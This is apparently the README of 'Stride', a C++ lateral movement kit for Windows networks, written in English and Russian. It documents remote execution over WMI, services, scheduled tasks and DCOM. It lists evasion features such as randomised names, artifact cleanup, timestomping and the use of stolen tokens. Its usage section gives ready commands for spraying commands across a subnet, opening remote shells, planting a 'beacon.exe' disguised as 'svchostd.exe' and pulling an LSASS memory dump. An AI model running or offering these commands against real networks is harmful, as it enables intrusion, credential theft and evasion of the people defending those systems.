# Stride

[![ci](https://github.com/d3xm0s/Stride/actions/workflows/ci.yml/badge.svg)](https://github.com/d3xm0s/Stride/actions/workflows/ci.yml)
[![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
![C++17](https://img.shields.io/badge/C%2B%2B-17-00599C.svg)

*[English](#english) | [Русский](#русский)*

## English

Lateral movement kit for Windows networks in a single static C++17 binary.
WinAPI + COM only - no Python, no Sysinternals, no PSEXESVC signatures.
Point it at a host, a host list, or a whole subnet and execute commands,
move files, or drop into an interactive shell - with artifacts that clean
up after themselves.

### Execution methods

| Method | Transport | Runs as | Artifacts |
|---|---|---|---|
| `wmi` | Win32_Process.Create over DCOM | connecting user | none persistent |
| `scm` | remote service create/start/delete | SYSTEM | service removed after run |
| `task` | ITaskService, hidden, highest runlevel | SYSTEM | task removed after run |
| `dcom` | MMC20.Application ExecuteShellCommand | connecting user | none persistent |

`auto` (default) tries them in order until one lands.

### OpSec

- Randomized service names, task names, and output files - no static signatures
- Automatic cleanup: services, tasks, and temp files are removed after execution
- Timestomp on uploaded files (timestamps copied from `explorer.exe`)
- Jitter between fleet targets
- No password on the wire when using the current logon session - Kerberos
  tickets and stolen tokens work as-is (`runas /netonly` flows included)

### Usage

```cmd
:: single target, explicit creds
stride --target 10.10.20.15 --user admin --pass P@ssw0rd --domain CORP --cmd "whoami /all"

:: current context (kerberos / stolen token)
stride --target dc01.corp.local --cmd "hostname"

:: interactive shell over WMI
stride --target 10.10.20.15 --user admin --pass P@ssw0rd --shell

:: fleet - spray one command across a subnet
stride --cidr 10.10.20.0/24 --user admin --pass P@ssw0rd --cmd "net user"
stride --targets hosts.txt --cmd "net localgroup administrators" --threads 8 --jitter 500

:: file transfer with timestomp
stride --target 10.10.20.15 --user admin --pass P@ssw0rd --upload beacon.exe "C:\Windows\Temp\svchostd.exe"
stride --target 10.10.20.15 --user admin --pass P@ssw0rd --download "C:\loot\lsass.dmp" lsass.dmp
```

### Build

```sh
make            # mingw-w64 cross-build
```

## Русский

Набор для lateral movement в Windows-сетях - один статический бинарь на
C++17, только WinAPI + COM. Без Python, без Sysinternals, без сигнатур
PSEXESVC. Целишься в хост, список хостов или целую подсеть - выполняешь
команды, двигаешь файлы, получаешь интерактивный шелл. Артефакты подчищаются
сами.

### Методы выполнения

| Метод | Транспорт | Контекст | Артефакты |
|---|---|---|---|
| `wmi` | Win32_Process.Create по DCOM | пользователь подключения | нет постоянных |
| `scm` | создание/запуск/удаление сервиса | SYSTEM | сервис удаляется после запуска |
| `task` | ITaskService, скрытая задача, highest | SYSTEM | задача удаляется после запуска |
| `dcom` | MMC20.Application ExecuteShellCommand | пользователь подключения | нет постоянных |

### OpSec

- Рандомные имена сервисов, задач и файлов вывода - нет статических сигнатур
- Автоочистка: сервисы, задачи и временные файлы удаляются после выполнения
- Timestomp загружаемых файлов (время копируется с `explorer.exe`)
- Jitter между целями в fleet-режиме
- Без пароля в сети при текущей сессии - Kerberos-билеты и краденые токены
  работают как есть (включая `runas /netonly`)

### Использование

```cmd
:: одна цель, явные креды
stride --target 10.10.20.15 --user admin --pass P@ssw0rd --domain CORP --cmd "whoami /all"

:: текущий контекст (kerberos / краденый токен)
stride --target dc01.corp.local --cmd "hostname"

:: интерактивный шелл через WMI
stride --target 10.10.20.15 --user admin --pass P@ssw0rd --shell

:: fleet - одна команда по всей подсети
stride --cidr 10.10.20.0/24 --user admin --pass P@ssw0rd --cmd "net user"

:: файлы с timestomp
stride --target 10.10.20.15 --upload beacon.exe "C:\Windows\Temp\svchostd.exe"
```

## License

MIT
